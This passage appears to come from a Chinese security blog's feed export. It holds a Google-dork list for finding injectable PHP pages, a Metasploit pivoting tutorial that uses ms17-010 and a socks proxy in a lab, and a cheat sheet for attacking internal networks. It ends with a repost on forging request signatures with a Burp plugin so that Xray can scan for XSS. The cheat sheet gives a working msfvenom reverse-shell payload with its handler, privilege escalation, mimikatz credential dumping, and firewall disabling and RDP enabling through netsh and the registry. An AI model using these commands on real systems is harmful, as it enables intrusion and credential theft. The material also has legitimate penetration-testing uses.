<td align="left">inurl:shredder-categories.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:top10.php?cat&#x3D;</td>
<td align="left">inurl:faq2.php?id&#x3D;</td>
<td align="left">inurl:tradeCategory.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:historialeer.php?num&#x3D;</td>
<td align="left">inurl:show_an.php?id&#x3D;</td>
<td align="left">inurl:product_ranges_view.php?ID&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:reagir.php?num&#x3D;</td>
<td align="left">inurl:preview.php?id&#x3D;</td>
<td align="left">inurl:shop_category.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:Stray-Questions-View.php?num&#x3D;</td>
<td align="left">inurl:loadpsb.php?id&#x3D;</td>
<td align="left">inurl:transcript.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:forum_bds.php?num&#x3D;</td>
<td align="left">inurl:opinions.php?id&#x3D;</td>
<td align="left">inurl:channel_id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:game.php?id&#x3D;</td>
<td align="left">inurl:spr.php?id&#x3D;</td>
<td align="left">inurl:aboutbook.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:view_product.php?id&#x3D;</td>
<td align="left">inurl:pages.php?id&#x3D;</td>
<td align="left">inurl:preview.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:newsone.php?id&#x3D;</td>
<td align="left">inurl:announce.php?id&#x3D;</td>
<td align="left">inurl:loadpsb.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:sw_comment.php?id&#x3D;</td>
<td align="left">inurl:clanek.php4?id&#x3D;</td>
<td align="left">inurl:pages.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:news.php?id&#x3D;</td>
<td align="left">inurl:participant.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:avd_start.php?avd&#x3D;</td>
<td align="left">inurl:download.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:event.php?id&#x3D;</td>
<td align="left">inurl:main.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:product-item.php?id&#x3D;</td>
<td align="left">inurl:review.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:sql.php?id&#x3D;</td>
<td align="left">inurl:chappies.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:material.php?id&#x3D;</td>
<td align="left">inurl:read.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:clanek.php4?id&#x3D;</td>
<td align="left">inurl:prod_detail.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:announce.php?id&#x3D;</td>
<td align="left">inurl:viewphoto.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:chappies.php?id&#x3D;</td>
<td align="left">inurl:article.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:read.php?id&#x3D;</td>
<td align="left">inurl:person.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:viewapp.php?id&#x3D;</td>
<td align="left">inurl:productinfo.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:viewphoto.php?id&#x3D;</td>
<td align="left">inurl:showimg.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:rub.php?idr&#x3D;</td>
<td align="left">inurl:view.php?id&#x3D;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">inurl:galeri_info.php?l&#x3D;</td>
<td align="left">inurl:website.php?id&#x3D;</td>
<td align="left"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>msf及socks代理转发</title>
    <url>/posts/dad1caf4.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://baynk.blog.csdn.net/article/details/117375754">https://baynk.blog.csdn.net/article/details/117375754</a></p>
</blockquote>
<h2 id="0x01-学习环境"><a href="#0x01-学习环境" class="headerlink" title="0x01 学习环境"></a><strong>0x01 学习环境</strong></h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640.png" alt="图片"></p>
<p>拓扑如上，现在已经拥有了<code>WIN2008</code>的<code>meterpreter</code>权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109141.png" alt="图片"></p>
<p>希望通过此主机进行代理转发，从而使<code>msf</code>能够攻击<code>WIN7</code>从而拿到权限。</p>
<h2 id="0x02-路由转发1"><a href="#0x02-路由转发1" class="headerlink" title="0x02 路由转发1"></a><strong>0x02 路由转发1</strong></h2><p>先在<code>meterpreter</code>中使用<code>route</code>进行查看<code>WIN2008</code>所在的网段信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109152.png" alt="图片"></p>
<p>通过<code>background</code>回到<code>msf</code>，使用<code>route</code>增加对应路由<code>route add 172.16.10.0 255.255.255.0 1</code>，<code>1</code>是挂起的<code>session</code>编号。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109153.png" alt="图片"></p>
<p>可以看到已经有路由了，用<code>ms17-010</code>打<code>win7</code>也可以成功拿到<code>shell</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109164.png" alt="图片"></p>
<h2 id="0x03-路由转发2"><a href="#0x03-路由转发2" class="headerlink" title="0x03 路由转发2"></a><strong>0x03 路由转发2</strong></h2><p>使用<code>post/multi/manage/autoroute</code>模块，在<code>msf6</code>以前就是在<code>meterpreter</code>中使用<code>run autoroute -s</code>指令，两者是等同的。</p>
<p>同样的，先使用<code>background</code>挂到后台。这里为了实验效果，先将上一个实验的路由给删除</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109165.png" alt="图片"></p>
<p>然后加载<code>post/multi/manage/autoroute</code>模块，调用<code>session</code>就可以了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109166.png" alt="图片"></p>
<p>和之前的效果是一样的。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a><strong>0x04 总结</strong></h2><p>这个环境是模拟现网中的一种情况，即<code>WIN2008</code>和<code>WIN7</code>都可以访问互联网的，但是互联网只能访问<code>WIN2008</code>的情况，经过尝试，如果<code>WIN7</code>不可以访问互联网时，反弹<code>shell</code>肯定会失败，改换成<code>bind_tcp</code>的<code>payload</code>后还是可以成功的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109177.png" alt="图片"></p>
<h2 id="0x05-你以为这就完了吗？"><a href="#0x05-你以为这就完了吗？" class="headerlink" title="0x05 你以为这就完了吗？"></a><strong>0x05 你以为这就完了吗？</strong></h2><p>这里其实有一个大问题，通过这种方式做代理转发，只能是<code>msf</code>使用，其它的应用无法使用，如果其它应用想用呢？当然也有办法，就是再加一个<code>sock</code>代理即可。</p>
<p>在<code>msf6</code>中代理模块改为了<code>socks_proxy</code></p>
<p>- </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/server/socks_proxy</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109178.png" alt="图片"></p>
<p>可以选择<code>sock</code>的版本，以及定义监听的接口IP和端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-16518398109179.png" alt="图片"></p>
<p>运行后，会自动挂入后台</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-165183981091710.png" alt="图片"></p>
<p>接着编辑本地的<code>proxychains</code>程序配置文件<code>vim /etc/proxychains.conf</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-165183981091711.png" alt="图片"></p>
<p>接着浏览器设置代理</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-165183981091712.png" alt="图片"></p>
<p>此时就可以通过浏览器直接访问内网了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-165183981091813.png" alt="图片"></p>
<p>如果此时希望使用<code>msf</code>或者<code>nmap</code>的话，就必须使用<code>proxychains</code>来进行启动程序，并且一定要注意<code>proxychains</code>只对<code>tcp</code>流量有效，所以<code>udp</code>和<code>icmp</code>都是不能代理转发的。</p>
<p>另外，这里<code>nmap</code>我自己测试有点坑，必须使用<code>nmap -sT -Pn</code>才可以，跳过<code>ping</code>扫描的同时一定要用建立连接的方式进行探测，还是有点奇怪的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-msf%E5%8F%8Asocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/640-165183981091814.png" alt="图片"></p>
<p><strong><code>OVER!</code></strong></p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透常用命令</title>
    <url>/posts/721e2121.html</url>
    <content><![CDATA[<h2 id="一、msfvenom"><a href="#一、msfvenom" class="headerlink" title="一、msfvenom"></a>一、msfvenom</h2><ol>
<li>生成反弹shell</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.1 lport=4444 -f exe -o re.exe</span><br></pre></td></tr></table></figure>

<h2 id="二、msfcosole"><a href="#二、msfcosole" class="headerlink" title="二、msfcosole"></a>二、msfcosole</h2><ol>
<li>msfcosole上线，监听msfvenom生成的反弹shell</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.1</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>msfconsole提权</li>
</ol>
<p><strong>普通提权</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getuid				# 查看当前用户uid</span><br><span class="line">getsystem			# 提权为systeem</span><br></pre></td></tr></table></figure>

<p><strong>通过迁移进程提权</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps 					# 查看进程</span><br></pre></td></tr></table></figure>

<p>若 PID&#x3D;360， User 为 <strong>NT AUTHORITY\SYSTEM</strong> ，只要将 反弹shell 迁移到这个进程即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">migrate 360			# 迁移到 PID 为360的进程</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>加载 mimikatz</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load mimikatz</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>开启 3389 端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run /post/windows/manage/enabled_rdp</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>设置跳板机</li>
</ol>
<blockquote>
<p>meterpreter 的版本不同命令也有差异</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取 win7 路由</span><br><span class="line">run get_local_subnets</span><br><span class="line"># 将路由添加到本地</span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line"># 查看添加的路由</span><br><span class="line">run autoroute -p</span><br><span class="line"># 打印路由</span><br><span class="line">route print</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>构建内网通道</li>
</ol>
<blockquote>
<p>因为将跳板机的路由添加到了本地，所以本机拥有两个ip，故监听0.0.0.0,两个ip地址都能访问该服务</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 1080</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后配置好proxychains4，这时，可以用 msf 的模块进行探测，但是速度不如 <strong>proxychains4 + nmap</strong> </p>
<p>msfcosole 使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 目标ip</span><br><span class="line">set rports 440-449</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>msf 扫描软件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>msf 扫描 C 段</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner        rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure>





<h2 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h2><ol>
<li>配置 proxychains4</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用 proxychains4 探测是否设置成功</li>
</ol>
<blockquote>
<p>除了能用 nmap 探测，还能用 curl 探测，但不可以使用 ping 探测是否代理成功，因为 ping 使用 icmp 协议</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 目标ip -p445</span><br></pre></td></tr></table></figure>







<h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h2><ol>
<li>关闭防火墙</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看是否有杀软</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p>或者 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>开启 3389 端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看端口是否开启成功</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | find &quot;3389&quot;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>改变编码方式，防止乱码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>



<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><ol>
<li>获取密码的hash值</li>
</ol>
<p><strong>Kiwi Commands</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">creds_msv</span><br></pre></td></tr></table></figure>

<p><strong>Password database Commands</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>获取明文密码</li>
</ol>
<p><strong>Kiwi Commands</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">creds_kerberos</span><br><span class="line">creds_wdigest</span><br><span class="line">creds_tspkg</span><br></pre></td></tr></table></figure>





<h2 id="kail"><a href="#kail" class="headerlink" title="kail"></a>kail</h2><ol>
<li>远程登录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesk ip</span><br></pre></td></tr></table></figure>







<h2 id="在线辅助网站"><a href="#在线辅助网站" class="headerlink" title="在线辅助网站"></a>在线辅助网站</h2><ol>
<li><a href="https://sr.xljtj.com/">Windows 杀软在线对比网站</a></li>
</ol>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Xray+BurpSuite自动挖掘带sign签名的漏洞</title>
    <url>/posts/6220c747.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://www.freebuf.com/vuls/261863.html">https://www.freebuf.com/vuls/261863.html</a>  w0xTeam</p>
<p>编者荐语：提供了一个思路，带sign签名的请求如何挖掘漏洞，browser-&gt;xray-&gt;burpsuite-&gt;服务器,用bp做了个中转，替换掉了sign值。</p>
<p>拓展思路我们完全可以写一个python代理服务器，拦截xray转发过来的请求，然后替换sign值再转发给服务器。</p>
<p>两者都可以尝试一下。</p>
<p>然后也推荐了一个简便的编写Burpsuite Python插件的方法。</p>
</blockquote>
<h2 id="一、起因："><a href="#一、起因：" class="headerlink" title="一、起因："></a>一、起因：</h2><p>Xray是一个非常好的自动化漏洞挖掘工具。我们通常在进行漏洞挖掘的时候，都会通过BurpSuite+Xray进行自动化的漏洞挖掘，官方也给了配置和使用方法，链接放到参考文献中，感兴趣的朋友也可以自己搜索一下。</p>
<p>工具虽然好用，但这次遇到的是一个有签名算法的目标，在这种情况下，上面的这套组合就显得有气无力了。尝试扫了一下，虽然发送了很多payload，但没有发现任何漏洞。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611544366_600e372eec4fee621b9b3.png!small" alt="img"></p>
<p>由于从事于漏洞挖掘工作，总有一种感觉（感觉很重要，大家都懂得），这个东西有漏洞。</p>
<p>最后通过自己努力和改造，终于挖到了XSS漏洞。这篇文章主要给大家说说我是怎么挖到这个漏洞的。</p>
<blockquote>
<p>XSS是web安全中最为常见的漏洞，XSS全称是Cross Site Script。XSS攻击通常指黑客通过“HTML注入”篡改了网页，插入了恶意脚本，从而控制用户浏览的一种攻击。这里的跨站访问，可以是从正常的网站跨到黑客的服务器，也可以是黑客的服务器跨到正常的网站。XSS漏洞经常出现在需要用户输入的地方，这些地方一旦对输入不进行处理，黑客就可以进行HTML注入，进而篡改网页。</p>
</blockquote>
<p>先放一张成功后的图片。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611542998_600e31d61083550ca6ac4.png!small" alt="img"></p>
<h2 id="二、必备工具："><a href="#二、必备工具：" class="headerlink" title="二、必备工具："></a>二、必备工具：</h2><p>操作系统: WIN10_X64</p>
<h4 id="1-BurpSuite"><a href="#1-BurpSuite" class="headerlink" title="1. BurpSuite"></a>1. BurpSuite</h4><p>渗透神器，如果你还不知道这个，那么只能说明你不是圈内人，赶快去百度一下吧。<br><a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a></p>
<h4 id="2-xray"><a href="#2-xray" class="headerlink" title="2. xray"></a>2. xray</h4><p>是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows &#x2F; macOS &#x2F; Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。<br><a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a></p>
<h4 id="3-jadx"><a href="#3-jadx" class="headerlink" title="3. jadx:"></a>3. jadx:</h4><p>jadx是个人比较喜欢的一款反编译利器，同时支持命令行和图形界面，能以最简便的方式完成apk的反编译操作。<br><a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a></p>
<h4 id="4-Jython"><a href="#4-Jython" class="headerlink" title="4. Jython:"></a>4. Jython:</h4><p>Jython本质上是一个Java应用程序，它允许编码人员使用Java编码调用Python库反之，也可以使用Python调用Java的库。<br><a href="https://www.jython.org/">https://www.jython.org</a></p>
<h4 id="5-Python"><a href="#5-Python" class="headerlink" title="5. Python:"></a>5. Python:</h4><p>我使用的是Python3.7</p>
<h2 id="三、原理："><a href="#三、原理：" class="headerlink" title="三、原理："></a>三、原理：</h2><h3 id="1、初始"><a href="#1、初始" class="headerlink" title="1、初始"></a>1、初始</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611543012_600e31e47b140b09cc2f8.png!small" alt="img"></p>
<p>分析一下原因，通过服务器端都是url的请求，应该是这样的处理方法（python伪代码）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#接收到客户端请求</span><br><span class="line">def Get_Request(param):</span><br><span class="line">		if param.sign != get_sign(param.url):</span><br><span class="line">			 return 0</span><br><span class="line">#开始对参数进行逻辑操作</span><br></pre></td></tr></table></figure>

<p>通过上面的图我们可以看出浏览器发出的链接都是直接发送到xray的，所以如果加入了签名算法，那么就直接返回了，根本到不了核心的逻辑。</p>
<h3 id="2、改造后"><a href="#2、改造后" class="headerlink" title="2、改造后"></a>2、改造后</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611543024_600e31f07be2b3b6c246f.png!small" alt="img"></p>
<p>从上面的图可以看到，先把url发到xray,由xray转发到BurpSuite，在Burp中加入了ptyhon插件对url计算sign，替换了原有的url，这样就可以跳过签名的检测了。</p>
<p>知道了原理。我们就可以行动了。</p>
<h2 id="四、最佳实践："><a href="#四、最佳实践：" class="headerlink" title="四、最佳实践："></a>四、最佳实践：</h2><h3 id="1-找到需要测试的目标。"><a href="#1-找到需要测试的目标。" class="headerlink" title="1. 找到需要测试的目标。"></a>1. 找到需要测试的目标。</h3><p>这里是的目标是apk文件，打开BurpSuite进行抓包，找到需要渗透测试的请求，发现请求中有sign的字段，应该是有签名校验的。形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxxx.com/data?id=12346&amp;imei=aabbcc&amp;sign=88a5e407a1c85d2ef063b8e2007278e9</span><br></pre></td></tr></table></figure>

<h3 id="2-找到sign签名的算法。"><a href="#2-找到sign签名的算法。" class="headerlink" title="2. 找到sign签名的算法。"></a>2. 找到sign签名的算法。</h3><p>关于怎么找算法，不是这篇文章的重点，这里简单介绍一下，无论是apk还是web都是一样的，apk的加密算法通常都放到so文件或者直接在java代码中；web的签名算法，通常都会写到js脚本中，作为一名合格的渗透人员，相信这个应该都不是难事。<br>本文的目标算法比较简单，作者把算法直接写到了apk中，使用jadx,搜索sign的字段，很容易就找到了算法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%88%A9%E7%94%A8Xray+BurpSuite%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B8%A6sign%E7%AD%BE%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E/1611543039_600e31ff1571e2dcce46f.png!small" alt="img"></p>
<h3 id="3-编写插件"><a href="#3-编写插件" class="headerlink" title="3.编写插件"></a>3.编写插件</h3><p>既然找到算法，下一步，就是开始编写BurpSuite的插件，插件的功能，就是根据url计算出sign的值，替换成新的url进行请求。</p>
<p>我们不造轮子，直接用官方的插件来修改。从Github上下载官方python插件，地址：</p>
<p><a href="https://github.com/portswigger/python-scripter">https://github.com/portswigger/python-scripter</a></p>
<p>官方有详细的API介绍文档，大家可以参考：</p>
<p><a href="https://portswigger.net/burp/extender/api/index.html">https://portswigger.net/burp/extender/api/index.html</a></p>
<p>贴上我修改后的源码的关键部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def gen_sign(_uri):</span><br><span class="line"></span><br><span class="line"> uri = _uri</span><br><span class="line"> secret_key = &quot;AABBBCCDDEEFFGG&quot;</span><br><span class="line"> parsed_tuple = urlparse.urlparse(uri)</span><br><span class="line"> _param_json = urlparse.parse_qs(parsed_tuple.query)</span><br><span class="line"></span><br><span class="line"> aList=[];</span><br><span class="line"> for _json_key,_json_vaule in _param_json.iteritems():</span><br><span class="line">         aList.append(_json_key)</span><br><span class="line"></span><br><span class="line"> aList.sort()</span><br><span class="line"> </span><br><span class="line"> for _json_key1 in aList:</span><br><span class="line">         sign +=_json_key1</span><br><span class="line">         sign +=_param_json[_json_key1][0]</span><br><span class="line"></span><br><span class="line"> sign +=secret_key</span><br><span class="line"> m = hashlib.md5()</span><br><span class="line"> m.update(sign)</span><br><span class="line"> a_md5 = m.hexdigest()</span><br><span class="line"> </span><br><span class="line"> return a_md5</span><br></pre></td></tr></table></figure>

